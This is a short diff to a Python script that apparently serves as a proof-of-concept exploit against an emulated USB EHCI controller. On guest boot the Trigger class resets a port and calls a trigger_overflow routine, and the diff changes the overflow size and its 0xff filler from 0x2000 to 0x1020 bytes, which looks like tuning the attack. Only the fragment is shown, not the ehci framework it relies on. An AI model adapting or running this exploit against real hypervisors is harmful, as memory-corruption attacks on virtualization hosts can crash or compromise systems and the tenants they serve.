@@ -14,7 +14,7 @@ class Trigger(ehci.Session):
     def on_boot(self, body):
         super().on_boot(body)  
         self.port_reset()
-        self.trigger_overflow(0x2000, b'\xff' * 0x2000)
+        self.trigger_overflow(0x1020, b'\xff' * 0x1020)
 
 if __name__ == "__main__":
     Trigger(Guest).run()
